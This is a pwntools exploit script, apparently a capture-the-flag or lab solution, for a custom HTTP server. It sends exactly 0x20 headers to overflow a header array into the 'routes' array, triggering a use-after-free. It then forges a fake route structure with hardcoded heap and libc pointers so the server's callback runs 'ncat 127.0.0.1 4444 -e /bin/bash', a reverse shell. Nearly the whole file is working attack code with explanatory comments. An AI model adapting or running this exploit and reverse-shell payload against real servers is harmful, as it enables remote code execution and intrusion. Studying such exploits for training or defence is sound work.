from pwn import * 

p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

'''
If we got to EXACTLY the length of the amount of headers for a 
response, it creates problems. 

Some of the usage of 'res_headers_lst' only check for NULL and 
NOT the maximum amount. As a result, we can use the pointer AFTER
this to do things. 
In practice, this is the 'routes' array! 

The usage includes an unnecessary free, which creates a UAF on the routes. 
'''
p.sendline(b"GET /files/hello_world.html" + b" HTTP/1.1")

#string += "Content-Length: %s\r\n" % (len(payload))
p.sendline(b"Connection:AAA") # Make a NEW connection after this 

for _ in range(0x1F):
    p.sendline(b"X-Request-Id: BBB")  # Need EXACTLY 0x20 headers to exploit this
p.sendline(b"")


#####
# Second Request
###
p.recvline() 

payload = b""

# The ROUTE is defined by US
p.sendline("ncat%20127.0.0.1%204444%20-e%20/bin/bash /" + " HTTP/1.1") 

'''
The 'routes' array is a list of pointers to routes. 
To fake this properly, we need to create a FAKE route. 
The KEY is going to be our list of pointers entries in the 
first of the headers.
- 0x110 sized chunk - same as the 'routes' allocation

Our VALUE is going to be our FAKE pointer for the entry.
- Verb (string) 
- Route (Pointer of to string) 
- Default Callback (function pointer) 

<<Fake 'Routes'>>:<<malicious route>>

When the 'default_callback' on the route is made, 
the 'RDI' register contains the ROUTE that is being checked. 
So, we can make the route our payload. Not subtle at all!
'''

# Key in the header - 0x110 sized chunk
fake_routes = p64(0x55555555f5b0) * 0x20 # Create a large LIST of pointers to our fake chunk.

fake_route =  b"ncat 127.0.0.1 4444 -e /bin/bash\x00" # Verb 
fake_route += (0x40 - len(fake_route)) * b"B" # Filler for the REST of the verb - filler
fake_route += p64(0x55555555f5b0 + 0x40 + 0x10) # Route string pointer - set to ALL, since this is a POINTER
fake_route += p64(0x7ffff7e152c0) # Default callback - function pointer
fake_route += b"/\x00" # Route string pointer data
fake_route += (0x100 - len(fake_route)) * b"C"

crafted_chunks = fake_routes + b":" + fake_route


#string += "A" * (0x110 - 0x10) + ":" + "B" * 0x200 + "\r\n" # 0x100 bin to get the 'route' chunk
p.sendline(crafted_chunks) 
p.sendline(b"DDDDDDDDDDDDDDDDDDDDDDDD:EEEEEEEEEEEE") 
p.sendline("")
p.sendline("")

p.interactive()